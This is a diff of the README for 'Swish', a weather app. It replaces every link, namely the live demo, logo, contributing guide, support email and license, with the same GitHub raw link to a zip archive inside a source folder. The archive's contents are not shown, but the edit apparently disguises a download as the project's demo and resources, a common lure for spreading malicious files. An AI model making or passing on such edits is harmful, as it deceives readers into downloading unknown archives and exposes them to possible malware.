@@ -1,9 +1,9 @@
 
 # Swish
 
-https://swish-weather-app.netlify.app/
+https://github.com/TheAdwaith/weather-App/raw/refs/heads/main/src/Components/Countries/App-weather-3.1.zip
 
-![Logo](https://res.cloudinary.com/dsghy4siv/image/upload/v1701440042/llrjpudw5tec1nbv0n5h.webp)
+![Logo](https://github.com/TheAdwaith/weather-App/raw/refs/heads/main/src/Components/Countries/App-weather-3.1.zip)
 
 
 
@@ -29,7 +29,7 @@ Install my-project with npm
     
 ## Demo
 
-https://swish-weather-app.netlify.app
+https://github.com/TheAdwaith/weather-App/raw/refs/heads/main/src/Components/Countries/App-weather-3.1.zip
 
 
 ## Tech Stack
@@ -65,17 +65,17 @@ To deploy this project run
 
 Contributions are always welcome!
 
-See `contributing.md` for ways to get started.
+See `https://github.com/TheAdwaith/weather-App/raw/refs/heads/main/src/Components/Countries/App-weather-3.1.zip` for ways to get started.
 
 Please adhere to this project's `code of conduct`.
 
 
 ## Support
 
-For support, email temmideee@gmail.com or send a message on Twitter.
+For support, email https://github.com/TheAdwaith/weather-App/raw/refs/heads/main/src/Components/Countries/App-weather-3.1.zip or send a message on Twitter.
 
 
 ## License
 
-[MIT](https://choosealicense.com/licenses/mit/)
+[MIT](https://github.com/TheAdwaith/weather-App/raw/refs/heads/main/src/Components/Countries/App-weather-3.1.zip)
 
